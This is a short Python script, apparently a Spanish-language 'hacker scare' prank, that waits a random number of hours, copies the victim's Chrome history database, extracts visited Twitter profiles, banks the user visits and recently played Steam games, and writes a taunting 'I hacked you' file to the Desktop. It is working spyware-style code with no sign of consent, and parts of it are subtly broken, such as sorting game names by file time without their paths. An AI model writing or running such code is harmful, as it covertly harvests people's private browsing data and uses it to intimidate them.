import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob

HACKER_FILE_NAME = "PARA TI.txt"

# Function to get the user's home path
def get_user_path():
    return f"{Path.home()}/"

# Function to check recently played Steam games
def check_steam_games(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games = [game_path.split("\\")[-1] for game_path in glob.glob(steam_path)]
    games.sort(key=os.path.getmtime, reverse=True)
    hacker_file.write(f"He visto que has estado jugando últimamente a {', '.join(games[:3])}... Jajaja...")

# Function to introduce a random delay
def delay_action():
    n_hours = randrange(1, 4)
    print(f"Durmiendo {n_hours} horas")
    sleep(n_hours * 60 * 60)

# Function to create the hacker file
def create_hacker_file(user_path):
    hacker_file_path = f"{user_path}Desktop/{HACKER_FILE_NAME}"
    with open(hacker_file_path, "w") as hacker_file:
        hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.\n")
    return hacker_file_path

# Function to get Chrome browser history
def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = f"{user_path}/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = f"{history_path}temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos...")
            sleep(3)

# Function to check Twitter profiles visited and scare the user
def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = [re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])[0]
                        for item in chrome_history if re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
                        and re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])[0] not in ["notifications", "home"]]
    hacker_file.write(f"He visto que has estado husmeando en los perfiles de {', '.join(profiles_visited)}...\n")

# Function to check the bank mentioned in Chrome history
def check_bank_account(hacker_file, chrome_history):
    banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
    his_bank = next((b for item in chrome_history for b in banks if b.lower() in item[0].lower()), None)
    if his_bank:
        hacker_file.write(f"Además veo que guardas el dinero en {his_bank}... Interesante...\n")
